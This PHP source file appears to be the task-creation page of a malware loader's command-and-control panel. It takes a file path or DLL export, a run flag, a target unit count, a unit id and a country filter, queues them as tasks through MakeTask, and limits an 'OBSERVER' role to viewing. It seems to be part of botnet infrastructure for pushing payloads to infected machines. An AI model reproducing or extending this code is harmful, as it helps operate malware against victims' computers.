<?php
   session_start();

   error_reporting( 0 );

   if ( !( isset( $_SESSION['Name'] ) ) )
   {
      header( "Location: Login.php" );
      exit;
   }

   include( "Header.php" );
   include( "Functions.php" );
   include( "Cfg/Lang.php" );

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 1px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
                  <div align = center>
                     <font color=\"#E4E9F7\">" . $_SESSION['Name'] . $lang["_008"] . "</font>
                  </div>
            </td>
            </tr>
      </table>";

   sTable();

   if( isset( $_POST['submit'] ) ) 
   { 
      if ( $_POST['filetype'] == 1 )
      {
         MakeTask( $_POST['path']  . ":::" . $_POST['dllfunction'], $_POST['comment'], $_POST['arc'], "0", $_POST['filetype'], $_POST['folder'], $_POST['count'], $_POST['unitid'], $_POST['country'] ); 
      }
      else
      {
         MakeTask( $_POST['path'], $_POST['comment'], $_POST['arc'], $_POST['run'], $_POST['filetype'], $_POST['folder'], $_POST['count'], $_POST['unitid'], $_POST['country'] ); 
      }

      echo "<meta http-equiv=\"refresh\" content=\"1; url=Show_Tasks.php\">"; 
   }
   else
   {
      if ( $_SESSION['Name'] != "OBSERVER" )  
      {
         echo ( MakeFormAlt( $_GET["count"], $_GET["unit"] ) ); 
      }
      else
      {
         echo $lang["0087"]; 
      }
   }

   include( "Footer.php" );
?> 